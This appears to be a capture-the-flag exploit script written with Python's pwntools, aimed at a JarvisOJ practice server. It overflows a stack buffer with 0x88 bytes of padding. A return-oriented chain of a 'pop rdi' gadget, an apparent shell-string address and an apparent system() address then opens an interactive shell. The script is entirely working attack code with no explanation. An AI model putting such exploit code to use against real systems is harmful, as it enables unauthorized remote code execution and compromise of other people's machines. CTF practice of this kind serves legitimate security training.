from pwn import *

r=remote("pwn2.jarvisoj.com",9882)

r.recvuntil("Input:")

sh=0x0600A90

adr=0x004004c0

pop_rdi_addr=0x4006b3

payload=(0x80+0x8)*"a"+p64(pop_rdi_addr)+p64(sh)+p64(adr)

r.sendline(payload)

r.interactive()
